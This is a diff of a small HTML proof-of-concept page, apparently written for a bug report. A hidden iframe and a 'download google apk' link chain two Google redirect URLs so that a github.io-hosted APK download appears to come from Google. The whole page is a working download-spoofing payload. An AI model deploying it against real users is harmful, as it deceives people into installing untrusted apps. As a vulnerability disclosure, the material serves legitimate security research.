@@ -1,12 +1,7 @@
+<iframe id="ifr" src style="display:none"></iframe>
 <a href="#" onclick="poc()">click me to download google apk</a>
 <script>
     function poc(){
-        // Double Google URL redirect untuk effect spoofing
-        const spoofedUrl = "https://www.google.com/url?q=" + 
-                          encodeURIComponent("https://www.google.com/url?q=" + 
-                          encodeURIComponent("https://ybt01.github.io/upload/app-debug.apk"));
-        
-        document.getElementById("ifr").src = spoofedUrl;
+        document.getElementById("ifr").src = "https://www.google.com/url?q=https://www.google.com/url?q%3Dhttps%3A%2F%2Fybt01.github.io%2Fupload%2Fapp-debug.apk%26sa%3DD%26source%3Dbuganizer%26usg%3DAOvVaw3nm-qJSzcGfjAOwSO0tcBK";
     }
 </script>
-<iframe id="ifr" src style="display:none"></iframe>
